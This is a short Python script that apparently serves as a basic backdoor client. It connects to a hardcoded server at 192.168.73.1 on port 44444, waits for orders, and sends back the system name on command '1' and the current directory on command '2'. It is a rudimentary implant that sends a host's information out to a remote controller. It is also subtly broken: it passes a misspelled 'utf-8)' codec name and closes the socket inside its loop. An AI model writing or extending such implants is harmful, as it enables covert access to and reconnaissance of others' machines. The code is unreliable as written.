import os
from socket import *
from os import *
from platform import *

pwd = getcwd()
sys = system()

diritems = listdir()

SRV_ADDR = "192.168.73.1"
SRV_PORT = 44444

sock = socket(AF_INET,SOCK_STREAM)
sock.connect((SRV_ADDR, SRV_PORT))

print("Waiting for order")

while True:
    data = sock.recv(1024)
    if (data.decode("utf-8)") == "1"):
        msg = '--System info Sent --\n' + sys
        sock.sendall(msg.encode())
        print(data.decode('utf-8'))
    elif (data.decode("utf-8)") == "2"):
        msg = '--Directory sent --\n' + pwd
        sock.sendall(msg.encode())
        print(data.decode('utf-8'))
    sock.close()